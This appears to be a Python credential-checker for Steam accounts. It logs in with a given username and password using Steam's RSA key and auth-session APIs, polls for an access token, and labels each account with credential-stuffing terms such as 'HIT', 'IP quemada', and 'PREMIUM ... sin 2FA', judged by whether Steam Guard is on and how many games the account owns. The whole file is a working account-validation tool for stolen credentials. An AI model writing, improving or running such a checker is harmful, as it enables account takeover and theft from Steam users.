
import urllib.parse, urllib.request, urllib.error, json, base64, os, time
from http.cookiejar import CookieJar

_RSA_URL = "https://api.steampowered.com/IAuthenticationService/GetPasswordRSAPublicKey/v1/"
_BEGIN_URL = "https://api.steampowered.com/IAuthenticationService/BeginAuthSessionViaCredentials/v1/"
_POLL_URL = "https://api.steampowered.com/IAuthenticationService/PollAuthSessionStatus/v1/"
_GAMES_URL = "https://api.steampowered.com/IPlayerService/GetOwnedGames/v1/"
_LOGIN_PAGE = "https://store.steampowered.com/login/"

_UA = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
_BASE_HDRS = {"User-Agent": _UA, "Accept": "application/json", "Origin": "https://store.steampowered.com", "Referer": "https://store.steampowered.com/login/"}

def _rsa_encrypt(password, mod_hex, exp_hex):
    mod = int(mod_hex, 16); exp = int(exp_hex, 16); key_len = (mod.bit_length() + 7) // 8
    msg = password.encode("utf-8"); pad_len = key_len - len(msg) - 3
    ps = bytearray()
    while len(ps) < pad_len: ps.extend(b for b in os.urandom(pad_len * 2) if b != 0)
    em = b"\x00\x02" + bytes(ps[:pad_len]) + b"\x00" + msg
    c = pow(int.from_bytes(em, "big"), exp, mod)
    return base64.b64encode(c.to_bytes(key_len, "big")).decode("ascii")

def _make_opener():
    jar = CookieJar()
    return urllib.request.build_opener(urllib.request.HTTPCookieProcessor(jar))

def _post_form(opener, url, form, timeout=20):
    data = urllib.parse.urlencode(form).encode()
    req = urllib.request.Request(url, data=data, headers=dict(_BASE_HDRS))
    req.add_header("Content-Type", "application/x-www-form-urlencoded")
    try:
        with opener.open(req, timeout=timeout) as r: return r.status, json.loads(r.read())
    except urllib.error.HTTPError as e:
        try: body = json.loads(e.read() or b"{}")
        except: body = {}
        return e.code, body
    except Exception as exc: return 0, {"_exc": str(exc)}

def _get_json(opener, url, params, timeout=20):
    full = url + "?" + urllib.parse.urlencode(params)
    req = urllib.request.Request(full, headers=dict(_BASE_HDRS))
    try:
        with opener.open(req, timeout=timeout) as r: return r.status, json.loads(r.read())
    except urllib.error.HTTPError as e:
        try: body = json.loads(e.read() or b"{}")
        except: body = {}
        return e.code, body
    except Exception as exc: return 0, {"_exc": str(exc)}

def check_steam_account(username, password):
    opener = _make_opener()
    try:
        req = urllib.request.Request(_LOGIN_PAGE, headers=dict(_BASE_HDRS))
        opener.open(req, timeout=20).close()
    except: pass

    s, r = _get_json(opener, _RSA_URL, {"account_name": username})
    rsa = (r.get("response") or {})
    if s != 200 or not rsa.get("publickey_mod"): return {"valid": False, "reason": f"Error RSA: HTTP {s}"}

    try: enc_pass = _rsa_encrypt(password, rsa["publickey_mod"], rsa["publickey_exp"])
    except Exception as exc: return {"valid": False, "reason": f"Error Encrypt: {exc}"}

    s, r = _post_form(opener, _BEGIN_URL, {
        "account_name": username, "encrypted_password": enc_pass, "encryption_timestamp": rsa["timestamp"], "remember_login": "true", "persistence": "1", "website_id": "Store",
    })

    resp = r.get("response") or {}; eresult = resp.get("eresult", 0)

    if eresult in (5, 18) or s == 401: return {"valid": False, "reason": "Credenciales inválidas"}
    if s == 200 and not resp: return {"valid": False, "reason": "Credenciales inválidas"}
    if eresult == 84: return {"valid": False, "reason": "Rate Limited (IP quemada)"}
    if not resp.get("client_id"): return {"valid": False, "reason": f"Error Auth: {s} (eresult {eresult})"}

    steamid = str(resp.get("steamid", "")); client_id = str(resp.get("client_id", "")); request_id = resp.get("request_id", "")
    confirmations = resp.get("allowed_confirmations") or []
    guard_types = {int(c.get("confirmation_type", 0)) for c in confirmations}
    
    if bool(guard_types - {0, 1}): 
        return {"valid": True, "reason": f"HIT (Steam Guard: {'Mobile' if 3 in guard_types or 4 in guard_types else 'Email'})"}

    access_token = None
    for _ in range(3):
        s, r = _post_form(opener, _POLL_URL, {"client_id": client_id, "request_id": request_id})
        pr = r.get("response") or {}
        if pr.get("access_token"): access_token = pr["access_token"]; break
        time.sleep(2)

    if not access_token: return {"valid": False, "reason": "Error Poll: no token"}

    s, r = _get_json(opener, _GAMES_URL, {"access_token": access_token, "steamid": steamid, "include_appinfo": "true", "include_played_free_games": "false"})
    game_count = 0
    if s == 200: resp_games = r.get("response") or {}; game_count = resp_games.get("game_count", 0)

    return {"valid": True, "reason": f"PREMIUM ({game_count} juegos, sin 2FA)" if game_count > 0 else "FREE (0 juegos, sin 2FA)"}
